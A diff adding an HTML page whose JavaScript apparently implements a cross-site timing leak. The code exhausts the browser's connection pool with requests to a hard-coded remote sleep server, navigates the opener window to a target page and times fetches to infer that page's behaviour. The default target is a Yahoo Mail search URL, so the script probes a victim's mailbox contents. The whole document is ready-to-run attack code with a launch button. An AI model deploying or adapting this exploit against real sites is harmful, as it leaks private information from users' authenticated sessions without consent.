@@ -1,0 +1,96 @@
+<body>
+<table id="log"/>
+<script>
+
+const long_sleep = 30;
+const short_sleep = 0.2;
+const sock_cnt_start = 250;
+const sleep_server_ip = '104.155.96.42';
+const sleep_server_port = 1337;
+const test_server_url = 'http://127.0.0.1:631/';
+
+function log(s) {
+  document.getElementById('log').insertRow(-1).innerText = `[*] ${s}`;
+}
+
+async function time_fetch() {
+  let start = window.performance.now();
+  await fetch(test_server_url, {mode: 'no-cors'});
+  let end = window.performance.now();
+  return end - start;
+}
+
+function timeout(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function fetch_sleep(i, t) {
+  return fetch(`http://${i}.${sleep_server_ip}.xip.io:${sleep_server_port}/sleep?t=${t}`, {mode: 'no-cors'});
+}
+
+async function block_socket(i) {
+  fetch_sleep(i, long_sleep);
+  // needed?
+  await timeout(0);
+}
+
+async function exhaust_sockets() {
+  let i = 1;
+  for (; i < sock_cnt_start; i++) {
+    block_socket(i);
+  }
+  for (; i < 300; i++) {
+    let promise = fetch_sleep(0, short_sleep);
+    let fetch_time = await time_fetch();
+    await Promise.resolve(promise);
+    if (fetch_time >= short_sleep*1000) {
+      break;
+    }
+    block_socket(i);
+  }
+  log('used ' + (i-1) + ' connections');
+}
+
+async function time_page_loads(url, timing_cnt=512) {
+  log(`timing "${url}"`);
+  let timings = new Array();
+  window.opener.location = url;
+  for (let i = 0; i < timing_cnt; i++) {
+    let val = Math.round(await time_fetch()*1000)/1000;
+    if (val >= 10) {
+      timings.push(val);
+    }
+  }
+  return timings;
+}
+
+async function doit(target) {
+  log('Exhausting connection pool');
+  await exhaust_sockets();
+  let timings = await time_page_loads(target);
+  log(`results:\n${timings.join('\n')}`);
+}
+
+let target = new URLSearchParams(location.search).get('target');
+
+if (location.hash == '#doit') {
+  doit(target);
+} else {
+  let input = document.createElement('input');
+  input.id = 'target';
+  if (target) {
+    input.value = target;
+  } else {
+    input.value = 'https://mail.yahoo.com/d/search/keyword=faaaaar123xaa';
+  }
+  input.size = '70';
+  let button = document.createElement('button');
+  button.innerText = 'doit';
+  button.onclick = () => {
+    window.open(`${location.origin}${location.pathname}?target=${encodeURIComponent(input.value)}#doit`);
+  };
+  document.body.appendChild(input);
+  document.body.appendChild(button);
+}
+
+</script>
